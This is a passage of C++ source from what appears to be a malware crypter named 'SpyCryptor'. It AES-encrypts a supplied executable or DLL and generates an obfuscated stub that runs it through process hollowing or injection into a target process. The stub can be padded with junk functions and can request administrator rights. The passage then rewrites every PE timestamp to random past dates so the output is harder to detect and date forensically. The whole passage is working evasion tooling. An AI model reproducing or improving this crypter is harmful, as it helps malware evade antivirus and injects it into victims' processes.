		if (!strcmp(argv[i], "-g") || !strcmp(argv[i], "-gentrash"))
			trash = true;
		if (!strcmp(argv[i], "-m") || !strcmp(argv[i], "-requireadmin"))
			manifest = true;
		else if (!strcmp(argv[i], "-i") || !strcmp(argv[i], "--in")) {
			if (i + 1 < argc) {  
				i++;
				infile_path = argv[i];  
				input = true;
				printf("input file path %s\n", infile_path);
			}
			else {  
				std::cerr << "-in option requires one argument." << std::endl;
				system("pause");
				return;
			}
		}
		else if (!strcmp(argv[i], "-o") || !strcmp(argv[i], "-out")) {
			if (i + 1 < argc) {  
				i++;
				char* optarg = argv[i];
				output = true;
				if (!strcmp(optarg, "exe"))
					type = 0;
				else if (!strcmp(optarg, "dll"))
					type = 2;
			}
			else {  
				std::cerr << "-out option requires one argument." << std::endl;
				system("pause");
				return;
			}
		} 
		else if (!strcmp(argv[i], "-t") || !strcmp(argv[i], "-target")) {
			if (i + 1 < argc) {
				i++;
				target_name = argv[i];
				target = true;
				printf("Target process name %s\n", target_name);
			}
			else {
				std::cerr << "-target option requires one argument." << std::endl;
				system("pause");
				return;
			}
		}
	}
 
	if (argc < 5 || !input || !output)
	{
		//manual map (if source is dll) or process hollow (if source is exe)
		printf("Usage: SpyCryptor.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-console] [-gentrash] [-requireadmin]\r\n"); 
		system("pause");
		return;
	}

	printf("Console present: %d\n", conpresent);
	printf("Generate trash functions: %d\n", trash);
	printf("Require admin: %d\n", manifest);

	CrypterPackageCtx* ctx = new CrypterPackageCtx;
	int cpinit = CrypterPackageInit(ctx, (const char*)infile_path);

	printf("initiated %s\n", infile_path);

	FILE* stream = fopen(ctx->infile, "rb");

	if (stream == NULL)
	{
		fprintf(stderr, "Failed opening file %s: ", ctx->infile);
		perror(ctx->infile);
		return;
	}

	size_t fsize;
	fseek(stream, 0, SEEK_END);
	fsize = ftell(stream);

	if (fsize == 0 || fsize < 0) {
		fprintf(stderr, "Failed reading file %s: ", ctx->infile);
		perror("");
		return;
	} 
	rewind(stream);

	unsigned char* idata = (unsigned char*)malloc(sizeof(unsigned char) * fsize);
	size_t result = fread(idata, 1, fsize, stream);
	printf("fread %d fsize %d\n", result, fsize);

	PIMAGE_DOS_HEADER orig_dos = (PIMAGE_DOS_HEADER)idata;
	if (orig_dos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		_tprintf(_T("Error: file not have dos signature!\r\n")); 
		system("pause");
		return;
	}

	PIMAGE_NT_HEADERS orig_nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)orig_dos + orig_dos->e_lfanew);
	if (orig_nt->Signature != IMAGE_NT_SIGNATURE)
	{
		_tprintf(_T("Error: file not have nt signature!\r\n"));
		system("pause");
		return;
	}

	mConfigLoader cfg_loader(&config, orig_dos);

	cfg_loader.load_default();

	import.load_config();

	if (random.get_less(0, 1))
	{
		import.set_procs_type(IPT_A);
	}
	else {
		import.set_procs_type(IPT_W);
	}
	 
	max_build_procs = random.get_less(config.code.block_call.count.min, config.code.block_call.count.max);

	mVars			globals(VARS_TYPE_GLOBALS, NULL);

	mCode				stub(0xFFFF);
	mCode				stub2(0xFFFF); 
	mFunction			ep(&globals);
	mCode			gen_code(0xFFFF);

	PMCODE_BLOCK continue_block = ep.generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_START_EP);

	mCodeLines		lines(ep.get_code_generator(), continue_block);

	//

	if (orig_nt->FileHeader.Characteristics & IMAGE_FILE_DLL)
		type++;

	printf("Input file is DLL? (%x)\n", orig_nt->FileHeader.Characteristics & IMAGE_FILE_DLL);

	PCHAR platform = (orig_nt->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? (PCHAR)"X86" : (PCHAR)"X64");
	PCHAR platform_vcvars = (orig_nt->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? (PCHAR)"32" : (PCHAR)"64");
	printf("platform %08x\n", orig_nt->FileHeader.Machine);

	printf("Extracted contents of %s\n", ctx->infile);

	if (RAND_bytes(ctx->key, CRYPTER_BLOCK_LENGTH_BYTES) < 0) {
		fprintf(stderr, "Failed generating random key (RAND_bytes)");
		return;
	}

	printf("Generated random AES128 Cryto Pack key: ");
	for (int i = 0; i < CRYPTER_BLOCK_LENGTH_BYTES; ++i)
		printf("%02X", ctx->key[i]);
	putchar('\n');

	if (RAND_bytes(ctx->iv, CRYPTER_BLOCK_LENGTH_BYTES) < 0) {
		fprintf(stderr, "Failed generating random initialization vector (RAND_BYTES)");
		return;
	}

	printf("Generated random initialization vector: ");
	for (int i = 0; i < CRYPTER_BLOCK_LENGTH_BYTES; ++i)
		printf("%02X", ctx->iv[i]);
	putchar('\n');

	struct AES_ctx aes;

	AES_init_ctx_iv(&aes, ctx->key, ctx->iv);
	AES_CBC_encrypt_buffer(&aes, idata, fsize);

	printf("Successfully encrypted payload - generating exe file\n\n");
	 
	char* encoded_file_contents = (char*)malloc(sizeof(char) * fsize * 5);
	char encoded_key[CRYPTER_BLOCK_LENGTH_BYTES * 2 + 1];
	char encoded_iv[CRYPTER_BLOCK_LENGTH_BYTES * 2 + 1];

	for (int i = 0; i < CRYPTER_BLOCK_LENGTH_BYTES; ++i)
	{
		snprintf(encoded_key + (size_t)i * (size_t)2, sizeof(encoded_key), "%02x", ctx->key[i]);
		snprintf(encoded_iv + (size_t)i * (size_t)2, sizeof(encoded_iv), "%02x", ctx->iv[i]);
	}

	for (int i = 0; i < result; ++i) {
		size_t loc = (size_t)encoded_file_contents + i * 5;
		snprintf((char* const)loc, 8, "0x%02x,", idata[i]);
	}

	if (strlen(encoded_file_contents) != (fsize * 5)) {
		printf("Looks like the full encryption failed as the parity does not match. You can try again to generate different key/IV (%d != %d)\n",
			strlen(encoded_file_contents), fsize * 5);
	}

	printf("Generated Crypter C source\n");

	char* source_out = (char*)malloc(strlen(infile_path) + 5);
	ZeroMemory(source_out, strlen(infile_path) + 5);
	memcpy(source_out, infile_path, strlen(infile_path));
	strcat(source_out, ".cpp");

	FILE* source_stream = fopen(source_out, "wb");

	if (source_stream == NULL)
	{
		fprintf(stderr, "Failed to open file (source) %s: ", source_out);
		perror("");
		return;
	}
	fprintf(stdout, "Source file: %s: \n", source_out);
	 
	char szExeFileName[MAX_PATH];
	GetModuleFileNameA(NULL, szExeFileName, MAX_PATH);
	string fullpath = string(szExeFileName);
	string curpath = fullpath.substr(0, fullpath.find_last_of("\\") + 1);

	stub.clear();

	stub <<  stub_
		;

	stub << "\r\n";

	MVAR_INFO* var = globals.first();
	for (int i = 0; var; i++)
	{ 
		stub << var->string << ";\r\n";
		var = globals.next();
	}

	for (int i = 0; i < all_functions.get_count(); i++)
	{
		mFunction* func = all_functions.get_value(i);
		if (!lstrcmpA(func->get_name(), "DllMain") || !lstrcmpA(func->get_name(), "WinMain") || !lstrcmpA(func->get_name(), "wWinMain"))
			continue;
		func->get_prototype_string(stub);
	}

	stub2.clear();

	for (int i = 0; i < all_functions.get_count(); i++)
	{
		all_functions.get_value(i)->get_string(stub2);
	} 

	fprintf(source_stream, CRYPTER_BASE_SOURCE, trash? stub.get() : "", curpath.c_str(), type % 2 == 0 ? "tools/runPE64.h" : "tools/InjectDll.h", curpath.c_str(), curpath.c_str(), curpath.c_str(),
		encoded_file_contents, encoded_key, encoded_iv,
		type < 2 ? "int main(){if(1){" : "BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){if (ul_reason_for_call == DLL_PROCESS_ATTACH){",
		trash ? "function_trash_0();" : "", trash ? stub2.get() : "");

	fclose(source_stream);

	//main.h
	char* header = (char*)malloc(strlen(curpath.c_str()) + 14);
	ZeroMemory(header, strlen(curpath.c_str()) + 14);
	memcpy(header, curpath.c_str(), strlen(curpath.c_str()));
	strcat(header, "\\tools\\main.h");
	FILE* header_stream = fopen(header, "wb");
	if (header_stream == NULL)
	{
		fprintf(stderr, "Failed to open file (header) %s: ", header);
		perror("");
		return;
	}
	fprintf(stdout, "Header file: %s: \n", header);
	 
	const char*  header_source =
		"#pragma once\r\n"
		"#include \"tools/DataObfuscator.h\"\r\n"
		"%s\r\n" //define DEBUG
		"%s\r\n" //define INJECT_TO_EXISTING_PROCESS
		"const char* procname = XorStr(\"%s\");\r\n"
		"#ifdef DEBUG\r\n"
		"#define printfdbg printf\r\n"
		"#else\r\n"
		"#define printfdbg(...)\r\n"
		"#endif\r\n"
		"\r\n";

	fprintf(header_stream, header_source, conpresent ? "#define DEBUG" : "", target ? "#define INJECT_TO_EXISTING_PROCESS" : "", target ? target_name : "");

	fclose(header_stream);
	//

	_tprintf(_T("Building...\n"));

	//CREATING & EXECUTING BATFILE
	char* out_exe = (char*)malloc((strlen(infile_path) + 5));
	ZeroMemory(out_exe, (strlen(infile_path) + 5));
	memcpy(out_exe, infile_path, (strlen(infile_path)));
	if (type < 2)
		strcat(out_exe, ".exe");
	else strcat(out_exe, ".dll");

	string VSpath = Exec((char*)"powershell.exe -ExecutionPolicy Bypass -Command \"Get-ChildItem HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall | foreach { Get-ItemProperty $_.PsPath } | where { $_.DisplayName -like '*Visual Studio*' -and $_.InstallLocation.Length -gt 0 } | sort InstallDate -Descending | foreach { (Join-Path $_.InstallLocation 'VC\\Auxiliary\\Build') } | where { Test-Path $_ } | select -First 1\"");

	VSpath = VSpath.substr(0, VSpath.length() - 1);
	 
	char MANIFEST[0x500];
	ZeroMemory(MANIFEST, 0x500);
	if (manifest) snprintf(MANIFEST, 0x500, "/MANIFEST /MANIFESTUAC:\"level = 'requireAdministrator' uiAccess = 'false'\" & mt.exe -manifest \"%s.manifest\" -outputresource:\"%s;%c\" -validate_manifest ", out_exe, out_exe, type < 2 ? '1' : '2');
 
	char BAT_SRC[0x1000];
	ZeroMemory(BAT_SRC, 0x1000);
	snprintf(BAT_SRC, 0x1000, "call \"%s\\vcvars%s.bat\"&"
		"cl.exe \"%s\" kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib version.lib /nologo /GS- /MT /link /subsystem:windows /MACHINE:%s /SAFESEH:NO /OUT:\"%s\" /FIXED:NO /DYNAMICBASE /NXCOMPAT %s %s", 
		VSpath.c_str(), platform_vcvars, source_out, platform, out_exe, type < 2 ? "/entry:mainCRTStartup" : "/DLL", manifest ? MANIFEST : "\"");

	fprintf(stdout, BAT_SRC);
	cout << endl;

	Exec(BAT_SRC);

	//timestamp cleaner
	int from = 13046400, to = 63072000; //half-year to two years
	int timestamp = 0;

	std::random_device rd;
	std::mt19937 mt(rd());
	std::uniform_int_distribution<int> dist(from, to);
	timestamp = time(0) - dist(mt);
	printf("Generated random TimeDateStamp -> %d ", timestamp);
	PrintTimeDateStamp(timestamp);

	std::ifstream src(out_exe, std::ios::binary);
	if (!src) {
		std::cout << "Cannot open file for reading!" << std::endl;
	}

	//--------------- FS Redirector Stuff ----------------------------
	if (ResolveIsWow64Process())
	{
		BOOL bResult = FALSE;
		BOOL B = IsWow64Process(GetCurrentProcess(), &bResult);
		if (B && bResult)
		{
			if (ResolveWow64DisableWow64FsRedirection())
			{
				BOOL bOld;
				Wow64DisableWow64FsRedirection((PVOID*)&bOld);
			}
		}
	}
	//---------------- Start Reading from Input File -----------------
	HANDLE hFile = 0;
	HANDLE hMapping = 0;
	unsigned char* pMap = MapInputFile(out_exe, &hFile, &hMapping);
	if (!pMap)
	{
		printf("Can't read TimeDateStamp from input file. Error: %x\r\n", GetLastError());
		system("pause");
		return;
	}
	else printf("File mapped at 0x%08X\n", pMap);

	char* origpath = new char[MAX_PATH];
	memcpy(origpath, out_exe, MAX_PATH);
	 
	src.seekg(0, std::ios::end);
	int length = src.tellg();
	src.seekg(0, std::ios::beg);
	char* buffer = new char[length]; 	// allocate memory:
	src.read(buffer, length); // read data as a block:
	src.close();
	if (!src.good())
		printf("Error occurred at reading time!\n");

	if (GetFileSize(hFile, 0) == 0)
	{
		UnmapInputFileAndCloseHandles(pMap, hMapping, hFile);
		system("pause");
		return;
	}

	IMAGE_DOS_HEADER DosHdr = { 0 };
	IMAGE_NT_HEADERS NtHdr = { 0 };

	if (((IMAGE_DOS_HEADER*)pMap)->e_magic != 0x5A4D)
	{
		printf("Error: Not a PE\r\n");
		UnmapInputFileAndCloseHandles(pMap, hMapping, hFile);
		system("pause");
		return;
	}

	if (((IMAGE_DOS_HEADER*)pMap)->e_lfanew > 0x10000000)
	{
		printf("Error: Not a valid PE\r\n");
		UnmapInputFileAndCloseHandles(pMap, hMapping, hFile);
		system("pause");
		return;
	}

	//--------------------- TimeDateStamp From IMAGE_FILE_HEADER----------------------------
	IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pMap + ((IMAGE_DOS_HEADER*)pMap)->e_lfanew);
	printf(">> TimeDateStamp from _IMAGE_FILE_HEADER        ---> %x ", pNtHdrs->FileHeader.TimeDateStamp);
	PrintTimeDateStamp(pNtHdrs->FileHeader.TimeDateStamp);

	if (pNtHdrs->FileHeader.TimeDateStamp) {
		memcpy(buffer + (size_t)&pNtHdrs->FileHeader.TimeDateStamp - (size_t)pMap, &timestamp, sizeof(timestamp));
		printf("Changed _IMAGE_FILE_HEADER TimeDateStamp to %08X\n", timestamp);
	}
	//----------------------------------------------------------
	unsigned long size_OptionalHeader = pNtHdrs->FileHeader.SizeOfOptionalHeader;
	unsigned long NumberOfSections = pNtHdrs->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER* pSects = (IMAGE_SECTION_HEADER*)((size_t)pMap + ((IMAGE_DOS_HEADER*)pMap)->e_lfanew + sizeof(IMAGE_FILE_HEADER) + size_OptionalHeader + sizeof(pNtHdrs->Signature));

	unsigned long rva_Export = 0;
	unsigned long rva_Resource = 0;
	unsigned long rva_Debug = 0;
	unsigned long sz_Debug = 0;
	unsigned long rva_LoadConfig = 0;


	if (0 < (pNtHdrs->OptionalHeader.NumberOfRvaAndSizes))    rva_Export = pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress;
	if (2 < (pNtHdrs->OptionalHeader.NumberOfRvaAndSizes))    rva_Resource = pNtHdrs->OptionalHeader.DataDirectory[2].VirtualAddress;
	if (6 < (pNtHdrs->OptionalHeader.NumberOfRvaAndSizes))
	{
		rva_Debug = pNtHdrs->OptionalHeader.DataDirectory[6].VirtualAddress;
		sz_Debug = pNtHdrs->OptionalHeader.DataDirectory[6].Size;
	}
	if (10 < (pNtHdrs->OptionalHeader.NumberOfRvaAndSizes))   rva_LoadConfig = pNtHdrs->OptionalHeader.DataDirectory[10].VirtualAddress;
	//------------- Trying With Export Directory ------------------------------

	if (rva_Export)
	{
		IMAGE_EXPORT_DIRECTORY* pExport = (IMAGE_EXPORT_DIRECTORY*)(pMap + rva_Export);
		printf(">> TimeDateStamp from _IMAGE_EXPORT_DIRECTORY   ---> %x ", pExport->TimeDateStamp);
		PrintTimeDateStamp(pExport->TimeDateStamp);

		if (pExport->TimeDateStamp) {
			memcpy(buffer + VirtualToRaw((size_t)&pExport->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
			printf("Changed _IMAGE_EXPORT_DIRECTORY TimeDateStamp to %08X\n", timestamp);
		}

	}
	else
		printf(">> TimeDateStamp from _IMAGE_EXPORT_DIRECTORY   ---> Empty\r\n");
	//-------------- Trying With Resource Directory ----------------------------
	if (rva_Resource) //sz_Resource is not consulted by PE Loader
	{
		auto Parse_Resources_TimeDateStamp = [&](auto&& Parse_Resources_TimeDateStamp, _IMAGE_RESOURCE_DIRECTORY* pResource, unsigned long Offset, _IMAGE_RESOURCE_DIRECTORY_ENTRY* pParent, unsigned long StartingLevel, unsigned long NumberOfLevels)
		{
			if (!pResource) return;
			if (StartingLevel >= NumberOfLevels) return;

			unsigned long TimeDateStamp = 0;
			unsigned char Buffer[300] = { 0 };

			if (pResource)
			{
				_IMAGE_RESOURCE_DIRECTORY* pResourceX = (_IMAGE_RESOURCE_DIRECTORY*)(((unsigned char*)pResource) + Offset);
				TimeDateStamp = pResourceX->TimeDateStamp;

				if (!StartingLevel)
				{
					sprintf((char*)Buffer, "TimeDateStamp from root _IMAGE_RESOURCE_DIRECTORY is %s\r\n", GetTimeDateStamp_s(TimeDateStamp));
					PrintWithLevel(StartingLevel, Buffer);

					if (TimeDateStamp) {
						memcpy(buffer + VirtualToRaw((size_t)&pResourceX->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
						printf("Changed _IMAGE_RESOURCE_DIRECTORY TimeDateStamp to %08X\n", timestamp);
					}

				}
				else if (StartingLevel == 1)
				{
					if (pParent->NameIsString)
					{
						WSTRINGW* pResourceType = (WSTRINGW*)(((unsigned char*)(pResource)) + pParent->NameOffset);
						unsigned long Length = pResourceType->Length;
						unsigned long RealLength = wcslen(pResourceType->Buffer);

						if (Length > RealLength) Length = RealLength;
						if (Length > MAX_RESOURCE_TYPE_STRING_LENGTH) Length = MAX_RESOURCE_TYPE_STRING_LENGTH;

						char cBuffer[MAX_RESOURCE_TYPE_STRING_LENGTH + 1] = { 0 };
						WideCharToMultiByte(0, 0, pResourceType->Buffer, -1, cBuffer, Length, 0, 0);

						sprintf((char*)Buffer, "TimeDateStamp from _IMAGE_RESOURCE_DIRECTORY of type %s is %s\r\n", cBuffer, GetTimeDateStamp_s(TimeDateStamp));
						PrintWithLevel(StartingLevel, Buffer);

						if (TimeDateStamp) {
							memcpy(buffer + VirtualToRaw((size_t)&pResourceX->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
							printf("Changed _IMAGE_RESOURCE_DIRECTORY type %s TimeDateStamp to %08X\n", cBuffer, timestamp);
						}
					}
					else
					{
						char* pType = GetBasicResourceType(pParent->Name);
						if (pType)
							sprintf((char*)Buffer, "TimeDateStamp from _IMAGE_RESOURCE_DIRECTORY of type %s is %s\r\n", pType, GetTimeDateStamp_s(TimeDateStamp));
						else
							sprintf((char*)Buffer, "TimeDateStamp from _IMAGE_RESOURCE_DIRECTORY of type %#x is %s\r\n", pParent->Name, GetTimeDateStamp_s(TimeDateStamp));
						PrintWithLevel(StartingLevel, Buffer);

						if (TimeDateStamp) {
							memcpy(buffer + VirtualToRaw((size_t)&pResourceX->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
							printf("Changed _IMAGE_RESOURCE_DIRECTORY TimeDateStamp to %08X\n", timestamp);
						}
					}
				}
				else if (StartingLevel == 2)
				{
					if (pParent->NameIsString)
					{
						WSTRINGW* pResourceLang = (WSTRINGW*)(((unsigned char*)(pResource)) + pParent->NameOffset);
						unsigned long Length = pResourceLang->Length;
						unsigned long RealLength = wcslen(pResourceLang->Buffer);

						if (Length > RealLength) Length = RealLength;
						if (Length > MAX_RESOURCE_LANG_STRING_LENGTH) Length = MAX_RESOURCE_LANG_STRING_LENGTH;

						char cBuffer[MAX_RESOURCE_LANG_STRING_LENGTH + 1] = { 0 };
						WideCharToMultiByte(0, 0, pResourceLang->Buffer, -1, cBuffer, Length, 0, 0);

						sprintf((char*)Buffer, "TimeDateStamp from _IMAGE_RESOURCE_DIRECTORY of identifier %s is %s\r\n", cBuffer, GetTimeDateStamp_s(TimeDateStamp));
						PrintWithLevel(StartingLevel, Buffer);

						if (TimeDateStamp) {
							memcpy(buffer + VirtualToRaw((size_t)&pResourceX->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
							printf("Changed _IMAGE_RESOURCE_DIRECTORY of %s TimeDateStamp to %08X\n", cBuffer, timestamp);
						}
					}
					else
					{
						sprintf((char*)Buffer, "TimeDateStamp from _IMAGE_RESOURCE_DIRECTORY of identifier %#x is %s\r\n", pParent->Name, GetTimeDateStamp_s(TimeDateStamp));
						PrintWithLevel(StartingLevel, Buffer);

						if (TimeDateStamp) {
							memcpy(buffer + VirtualToRaw((size_t)&pResourceX->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
							printf("Changed _IMAGE_RESOURCE_DIRECTORY of %#x TimeDateStamp to %08X\n", pParent->Name, timestamp);
						}
					}

				}
				//---------------------------------------------------------------------
				unsigned long NumberOfEntries = pResourceX->NumberOfNamedEntries + pResourceX->NumberOfIdEntries;
				_IMAGE_RESOURCE_DIRECTORY_ENTRY* pResourceEntryX = (_IMAGE_RESOURCE_DIRECTORY_ENTRY*)(((unsigned char*)pResourceX) + sizeof(_IMAGE_RESOURCE_DIRECTORY));
				for (unsigned long i = 0; i < NumberOfEntries; i++)
				{
					if (pResourceEntryX[i].DataIsDirectory)
					{
						Parse_Resources_TimeDateStamp(Parse_Resources_TimeDateStamp, pResource, pResourceEntryX[i].OffsetToDirectory, &pResourceEntryX[i], StartingLevel + 1, NumberOfLevels);
					}
				}
			}
		};

		//Number of levels is 3 for typical linkers. For non-typical linkers, we should ignore next levels since they won't have TimeDateStamp.
		unsigned long NumberOfLevels = 3; //Default is ResourceType + Resource Id + Resource Language
		Parse_Resources_TimeDateStamp(Parse_Resources_TimeDateStamp, (_IMAGE_RESOURCE_DIRECTORY*)(pMap + rva_Resource), 0, 0, 0, NumberOfLevels);
	}
	//-------------- Trying With Debug Directory -------------------------------
	printf(">> TimeDateStamp from _IMAGE_DEBUG_DIRECTORY    ---> \r\n");
	unsigned long Number_Debug_Entries = 0;
	if (rva_Debug && sz_Debug)
	{
		Number_Debug_Entries = sz_Debug / sizeof(IMAGE_DEBUG_DIRECTORY);
		if (Number_Debug_Entries < 1)
		{
			printf("Empty\r\n");
		}
		else
		{
			IMAGE_DEBUG_DIRECTORY* pDebug = (IMAGE_DEBUG_DIRECTORY*)(pMap + rva_Debug);
			for (unsigned long i = 0; i < Number_Debug_Entries; i++)
			{
				printf(">>> TimeDateStamp from Entry  %x is:             ---> %x ", i + 1, (&pDebug[i])->TimeDateStamp);
				PrintTimeDateStamp((&pDebug[i])->TimeDateStamp);

				if ((&pDebug[1])->TimeDateStamp) {
					memcpy(buffer + VirtualToRaw((size_t) & (&pDebug[i])->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
					printf("Changed Entry %x TimeDateStamp to %08X\n", i + 1, timestamp);
				}

				if (((&pDebug[i])->Type) == 2)
				{
					//RSDS ---> Only RSDS + GUID + Age + FileName  ===> Useless
					//NB10 ---> NB10 + ZERO + TimeDateStamp + Age + FileName ===> Of Interest
					bool NB10_Found = false;
					unsigned char NB10Buffer[0xC] = { 0 };
					if ((&pDebug[i])->PointerToRawData) //Raw
					{
						if (SetFilePointer(hFile, (&pDebug[i])->PointerToRawData, 0, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
						{
							unsigned long BytesReadd = 0;
							if (ReadFile(hFile, NB10Buffer, 0xC, &BytesReadd, 0))
							{
								if (BytesReadd == 0xC)
								{
									if (strncmp((char*)NB10Buffer, "NB10", 4) == 0)
									{
										unsigned long TimeDateStampNB10 = *(unsigned long*)(&NB10Buffer[8]);
										printf(">>>> TimeDateStamp from PDB2.0 Debug Format     ---> ");

										if (!TimeDateStampNB10)		printf("Empty\r\n");
										else
										{
											PrintTimeDateStamp(TimeDateStampNB10);
											NB10_Found = true;

											memcpy(buffer + VirtualToRaw((size_t) & *(unsigned long*)(&NB10Buffer[8]) - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
											printf("Changed PDB2.0 Debug Format TimeDateStamp to %08X\n", timestamp);

										}
									}
								}
							}
						}
					}

					if (NB10_Found == false)
					{
						if ((&pDebug[i])->AddressOfRawData)  //RVA
						{
							memset(NB10Buffer, 0, 0xC);
							memcpy(NB10Buffer, pMap + ((&pDebug[i])->AddressOfRawData), 0xC);
							if (strncmp((char*)NB10Buffer, "NB10", 4) == 0)
							{
								unsigned long TimeDateStampNB10 = *(unsigned long*)(&NB10Buffer[8]);
								printf(">>>> TimeDateStamp from PDB2.0 Debug Format     ---> ");

								if (!TimeDateStampNB10)		printf("Empty\r\n");
								else
								{
									PrintTimeDateStamp(TimeDateStampNB10);

									memcpy(buffer + VirtualToRaw((size_t) & *(unsigned long*)(&NB10Buffer[8]) - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
									printf("Changed PDB2.0 Debug Format TimeDateStamp to %08X\n", timestamp);
								}
							}
						}
					}
				}

			}
		}
	}
	//-------------- Trying With "Load Config" Directory-------------------------

	if (rva_LoadConfig)
	{
		IMAGE_LOAD_CONFIG_DIRECTORY* pLoadConfig = (IMAGE_LOAD_CONFIG_DIRECTORY*)(pMap + rva_LoadConfig);
		printf("TimeDateStamp from _IMAGE_LOAD_CONFIG_DIRECTORY  ---> %x ", pLoadConfig->TimeDateStamp);
		PrintTimeDateStamp(pLoadConfig->TimeDateStamp);

		if (pLoadConfig->TimeDateStamp) {
			memcpy(buffer + VirtualToRaw((size_t)&pLoadConfig->TimeDateStamp - (size_t)pMap, pSects, NumberOfSections), &timestamp, sizeof(timestamp));
			printf("Changed _IMAGE_LOAD_CONFIG_DIRECTORY TimeDateStamp to %08X\n", 0); //obsolete since WinXP
		}
	}
	else printf("TimeDateStamp from _IMAGE_LOAD_CONFIG_DIRECTORY  ---> Empty\r\n");
	//---------------------------------------------------------------------------
	UnmapInputFileAndCloseHandles(pMap, hMapping, hFile);

	FILE* pFile;
	pFile = fopen(origpath, "wb");
	fwrite(buffer, 1, length, pFile);
	fclose(pFile);

	printf("Done\n");

	return;

	mem_free((PMBUF)idata);

	system("pause");

}
